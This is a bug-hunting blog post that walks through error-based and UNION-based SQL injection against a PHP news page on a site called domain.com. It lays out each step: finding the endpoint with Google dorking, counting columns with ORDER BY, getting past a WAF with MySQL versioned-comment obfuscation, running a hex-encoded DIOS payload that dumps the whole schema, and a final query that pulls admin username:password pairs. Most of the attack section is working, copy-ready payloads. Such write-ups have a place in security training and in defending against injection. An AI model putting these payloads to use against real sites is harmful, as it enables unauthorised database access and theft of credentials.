---
title: Bypassing WAF to do advanced Error-Based SQL Injection [Bug Hunting]
updated: 2020-10-24 14:15
---
During penetration testing, I faced with a website which on this article I will name it as **http://domain.com**
While browsing the website, I didn't see any single Parameter, even though the website was built with PHP. I quit browsing and started to Google Dorking.

## Google Dorking to look for endpoints

Using a simple dork **inurl:http://domain.com** , I managed to find some interesting endpoints:

![google_dorking](https://cdn-images-1.medium.com/max/800/1*dOzQ6osNlP2MtPepjmUfTg.jpeg)

The selected text in the image leads to an interesting point: **http://domain.com/REDACTED/news.php?id=13**
When opening the URL, I faced a MySQL Error. Even from the Google dorking result, you can see the error:

>Warning: mysql_fetch_assoc() expects parameter 1 to be resource, boolean give in … on line 27

![sql_error](https://cdn-images-1.medium.com/max/800/1*bD7dRU0SNgh8sUak9wrOtA.jpeg)

The error is very valuable to us, because we know that we can perform some Boolean-Based queries. Let's begin exploiting.

## Analyzing the website's behaviour

I tried some basic queries to see how website behaves. When I enter a bad query, I get 2 errors (1 is already a default error message, the other is caused by us).

![error_on_query](https://cdn-images-1.medium.com/max/800/1*Uc4eqKsfd1t22MTQLLIgYg.jpeg)

So we know that if our query is correct, we get only 1 error message, else we get 2 error messages. Because of this valuable information (which I took time to realise), let's get the number of columns by using ORDER BY query.

## Finding the number of columns with Boolean + ORDER BY query

Because server expects us a Boolean, I can use AND 0 boolean query, but you can also use some other boolean queries:

```
AND null
AND 1
```

Our query will now have both boolean and ORDER BY query. I always try to start from finding column from number 1, because it is 100% sure it won't show any error.

>http://domain.com/REDACTED/news.php?id=13 AND 0 order by 1-- -

![order_query_enumeration](https://cdn-images-1.medium.com/max/800/1*V27VRWpRNQu0vnlCYxmAdw.jpeg)

We get only 1 error message (from website, not from our query). Now that we know our query is correct, let's try increasing the number of column by 1 until we get a second error.

```
?id=13 AND 0 order by 1-- - (shows 1 error)
?id=13 AND 0 order by 2-- - (shows 1 error)
?id=13 AND 0 order by 3-- - (shows 1 error)
?id=13 AND 0 order by 4 -- - (shows 1 error)
?id=13 AND 0 order by 5-- - (shows 1 error)
?id =13 AND 0 order by 6-- - (shows 2 errors)
```

2 error messages will show up when we try to find the 6th column. So it means the database has only 5 columns.

>http://domain.com/REDACTED/news.php?id=13 AND 0 order by 6-

![2_errors_when_trying_to_find_6th_column](https://cdn-images-1.medium.com/max/800/1*8IzNhQcOpDh-kIsSpl1rUA.jpeg)

Before moving on, confirm that the database has 5 columns.

>http://domain.com/REDACTED/news.php?id=13 AND 0 order by 5-- -

![we_found_5_columns](https://cdn-images-1.medium.com/max/800/1*tXxMtjqfSHSfv7oI562PDQ.jpeg)

## Bypassing WAF and finding which column has data to dump

Now we are sure, because we don't get a second error. Now it is time to find which of these 5 columns is filled with information using UNION SELECT query.

>http://domain.com/REDACTED/news.php?id=13 AND 0 union select 1,2,3,4,5-- -

![waf_block_union_based_query](https://cdn-images-1.medium.com/max/800/1*R_52nBs2OihqbBqVruN9cg.jpeg)

Oh, our request got blocked from WAF, let's try bypassing it. There are tons of UNION queries to bypass WAF, but on this case what worked was:

>http://domain.com/REDACTED/news.php?id=13 AND 0 /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,2,3,4,5-- -

![waf_bypassed](https://cdn-images-1.medium.com/max/800/1*L3ExW1TVMPjUKUe1nLY8Cw.jpeg)

We bypassed WAF, however no number is displayed. Because of this, we don't know which columns we are going to dump. I looked through the whole page but nothing, so I decided to view the source code.

![source_code_column_number](https://cdn-images-1.medium.com/max/800/1*pde56DJHiNu_OK0nzmqASQ.jpeg)

In the selected part, we see the number 2 and 3. Great, now we know we have to focus on these 2 columns. In this case I will try the second column.

## Dumping all the data from the second column

### Dumping the database name
With **UNION** based query, let's dump the database name.

>http://domain.com/REDACTED/news.php?id=13 AND 0 /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,database(),3,4,5-- -

![dumping_db_name](https://cdn-images-1.medium.com/max/800/1*ZZDA5wR7U6Cu0UXRHzSsyg.jpeg)

Great, we see the database name.

### Dumping tables+columns automatically with DIOS

I will try injection a DIOS payload because getting every column for every table by manual SQL Injection is very long and boring. DIOS created a nice representation of the SQL we are facing with. The DIOS payload I used, is specially built for WAF bypassing using 0xHEX conversion and /*!00000 for string bypass.

```
http://domain.com/REDACTED/news.php?id=13 AND 0 /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,/*!00000concat*/(0x3c666f6e7420666163653d224963656c616e6422207374796c653d22636f6c6f723a7265643b746578742d736861646f773a307078203170782035707820233030303b666f6e742d73697a653a33307078223e496e6a6563746564206279204468346e692056757070616c61203c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d70696e6b2073697a653d353e44622056657273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20/*!00000from*/%20(select%20(@x:=0x00),(select%20(0)%20/*!00000from*/%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x)),3,4,5-- -
```

![dios_db_dumped](https://cdn-images-1.medium.com/max/800/1*_ochp_xXzWmqScYbWHe5qQ.jpeg)

### Dumping the data inside the columns

Great, we have the tables and the columns for each table. From all this big table, I fill focus on these 2 tables.

![focusing_on_user_table](https://cdn-images-1.medium.com/max/800/1*2MALUlU8GPXr4kFUhtwLsw.png)

This is what grabbed my attention. I will focus **user** table and will dump the data from 2 columns: **username** and **password**

The final Payload will be:

```
http://domain.com/REDACTED/news.php?id=13 AND 0 /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,(SELECT+GROUP_CONCAT(username,0x3a,password+SEPARATOR+0x3c62723e)+FROM+kbelb_db.user),3,4,5-- -
```

Now look at the source and we get the username:password of admin/user.

![credentials_dumped](https://cdn-images-1.medium.com/max/800/1*zje07q7CEF-n9XCx3geRfg.jpeg)
